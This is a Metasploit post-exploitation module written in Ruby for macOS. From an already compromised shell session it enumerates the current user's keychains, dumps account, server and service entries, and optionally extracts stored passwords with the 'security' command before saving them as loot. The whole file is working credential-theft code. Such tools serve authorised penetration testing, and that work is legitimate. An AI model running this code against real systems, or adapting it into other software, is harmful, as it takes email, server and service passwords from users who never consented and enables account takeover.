##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OS X Gather Keychain Enumeration',
      'Description'   => %q{
        This module presents a way to quickly go through the current user's keychains and
        collect data such as email accounts, servers, and other services.  Please note:
        when using the GETPASS option, the user will have to manually enter the password,
        and then click 'allow' in order to collect each password.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'ipwnstuff <e[at]ipwnstuff.com>'],
      'Platform'      => [ 'osx' ],
      'SessionTypes'  => [ 'shell' ]
    ))

    register_options(
      [
        OptBool.new('GETPASS', [false, 'Collect passwords.', false])
      ], self.class)
  end

  def list_keychains
    keychains = session.shell_command_token("security list")
    user = session.shell_command_token("whoami")
    print_status("The following keychains for #{user.strip} were found:")
    print_line(keychains.chomp)
    return keychains =~ /No such file or directory/ ? nil : keychains
  end

  def enum_accounts(keychains)
    user =  session.shell_command_token("whoami").chomp
    out = session.shell_command_token("security dump | egrep 'acct|desc|srvr|svce'")

    i = 0
    accounts = {}

    out.split("\n").each do |line|
      unless line =~ /NULL/
        case line
        when /\"acct\"/
          i+=1
          accounts[i]={}
          accounts[i]["acct"] = line.split('<blob>=')[1].split('"')[1]
        when /\"srvr\"/
          accounts[i]["srvr"] = line.split('<blob>=')[1].split('"')[1]
        when /\"svce\"/
          accounts[i]["svce"] = line.split('<blob>=')[1].split('"')[1]
        when /\"desc\"/
          accounts[i]["desc"] = line.split('<blob>=')[1].split('"')[1]
        end
      end
    end

    return accounts
  end

  def get_passwords(accounts)
    (1..accounts.count).each do |num|
      if accounts[num].has_key?("srvr")
        c = 'find-internet-password'
        s = accounts[num]["srvr"]
      else
        c = 'find-generic-password'
        s = accounts[num]["svce"]
      end

      cmd = session.shell_command_token("security #{c} -ga \"#{accounts[num]["acct"]}\" -s \"#{s}\" 2>&1")

      cmd.split("\n").each do |line|
        if line =~ /password: /
          unless line.split()[1].nil?
            accounts[num]["pass"] = line.split()[1].gsub("\"","")
          else
            accounts[num]["pass"] = nil
          end
        end
      end
    end
    return accounts
  end


  def save(data)
    l = store_loot('macosx.keychain.info',
      'plain/text',
      session,
      data,
      'keychain_info.txt',
      'Mac Keychain Account/Server/Service/Description')

    print_good("#{@peer} - Keychain information saved in #{l}")
  end

  def run
    @peer = "#{session.session_host}:#{session.session_port}"

    keychains = list_keychains
    if keychains.nil?
      print_error("#{@peer} - Module timed out, no keychains found.")
      return
    end

    user = session.shell_command_token("/usr/bin/whoami").chomp
    accounts = enum_accounts(keychains)
    save(accounts)

    if datastore['GETPASS']
      begin
        passwords = get_passwords(accounts)
      rescue
        print_error("#{@peer} - Module timed out, no passwords found.")
        print_error("#{@peer} - This is likely due to the host not responding to the prompt.")
      end
      save(passwords)
    end
  end

end
